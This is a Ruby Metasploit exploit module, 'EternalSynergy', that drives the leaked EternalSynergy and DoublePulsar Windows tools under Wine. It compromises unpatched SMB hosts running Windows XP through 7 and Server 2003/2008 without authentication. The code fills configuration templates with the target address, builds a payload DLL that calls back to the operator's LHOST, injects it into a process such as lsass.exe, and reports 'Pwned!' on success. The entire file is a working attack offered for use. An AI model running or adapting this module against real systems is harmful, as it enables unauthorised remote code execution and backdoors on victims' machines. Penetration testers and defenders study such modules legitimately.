require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  #include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'EternalSynergy',
      'Description' => %q{
          This module exploits a vulnerability on SMBv1/SMBv2 protocols through EternalChampion. 
	  After that, doublepulsar is used to inject remotely a malicious dll (it's will generate based on your 	  payload selection).
	  You can use this module to compromise a host remotely (among the targets available) without needing 		  nor authentication neither target's user interaction.
	  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
      },
      'Author'      =>
        [
          'Pablo Gonzalez (@pablogonzalezpe)',
          'Sheila A. Berta (@UnaPibaGeek)'
        ],
		'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'DefaultTarget'  => 8,
      'Targets'        =>
        [
	  ['Windows XP (all services pack) (x86) (x64)',{}],
	  ['Windows Server 2003 SP0 (x86)',{}],
	  ['Windows Server 2003 SP1/SP2 (x86)',{}],
	  ['Windows Server 2003 (x64)',{}],
          ['Windows Vista (x86)',{}],
	  ['Windows Vista (x64)',{}],
	  ['Windows Server 2008 (x86) ',{}],
	  ['Windows Server 2008 R2 (x86) (x64)',{}],
	  ['Windows 7 (all services pack) (x86) (x64)',{}]
	],
      'Arch'           => [ARCH_X86,ARCH_X64],
	  'ExitFunc'	   => 'thread',
	  'Target'		   => 0,
      'License'     => MSF_LICENSE,
		)

		)

	register_options([
		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
		OptString.new('ETERNALSYNERGYPATH',[true,'Path directory of EternalSynergy','/opt/Eternal/']),
		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/opt/Eternal/']),
		OptString.new('WINEPATH',[true,'WINE drive_c path','/opt/Eternal/']),
		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
	], self.class)

  register_advanced_options([
    OptInt.new('TimeOut',[false,'Timeout for blocking network calls (in seconds)',60]),
    OptString.new('DLLName',[true,'DLL name for Doublepulsar','eternal11.dll'])
  ], self.class)

  end

  def exploit

  #Custom XML Eternalblue
  print_status('Generating EternalSynergy XML data')
  cp = `cp #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.Skeleton.xml #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.xml`

  #WIN72K8R2 (4-8) and XP (0-3)
  if target.name =~ /7|8|8.1|2008|Vista/
	objective = "WIN72K8R2"
  else
	objective = "XP"
  end

  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ETERNALSYNERGYPATH']}/Eternalsynergy-1.0.1.xml`

  #Custom XML Doublepulsar
  print_status('Generating Doublepulsar XML data')
  cp = `cp #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.Skeleton.xml #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  dllpayload = datastore['WINEPATH'] + datastore['DLLName']
  dllpayload2 = dllpayload.gsub('/','\/')
  sed = `sed -i 's/%DLLPAY%/#{dllpayload2}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%PROCESSINJECT%/#{datastore['PROCESSINJECT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`

  #Generate DLL
  print_status("Generating payload DLL for Doublepulsar")
  pay = framework.modules.create(datastore['payload'])
  pay.datastore['LHOST'] = datastore['LHOST']
  dll = pay.generate_simple({'Format'=>'dll'})
  File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
	print_status("Writing DLL in #{dllpayload}")
	f.print dll
  end

  #Send Exploit + Payload Injection
  print_status('Launching EternalSynergy...')
  output = `cd #{datastore['ETERNALSYNERGYPATH']}; wine Eternalsynergy-1.0.1.exe`
  if output =~ /=-=-WIN-=-=/
  	print_good("Pwned! EternalSynergy success!")
  elsif output =~ /Backdoor returned code: 10 - Success!/
	print_good("Backdoor is already installed")
  else
	print_error("Are you sure it's vulnerable?")
  end
  print_status('Launching Doublepulsar...')
  output2 = `cd #{datastore['DOUBLEPULSARPATH']}; wine Doublepulsar-1.3.1.exe`
  if output2 =~ /Backdoor returned code: 10 - Success!/
	print_good("Remote code executed... 3... 2... 1...")
  else
	print_error("Oops, something was wrong!")
  end  

  handler

 end

end





